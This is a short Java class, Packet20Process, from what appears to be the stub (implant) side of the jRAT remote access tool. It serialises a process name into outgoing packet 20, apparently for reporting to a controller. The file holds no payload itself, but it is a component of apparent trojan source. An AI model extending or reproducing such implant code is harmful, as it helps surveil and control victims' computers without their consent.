package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.io.DataOutputStream;


public class Packet20Process extends AbstractOutgoingPacket {

	private String process;

	public Packet20Process(String process) {
		this.process = process;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(process);
	}

	@Override
	public byte getPacketId() {
		return 20;
	}

}
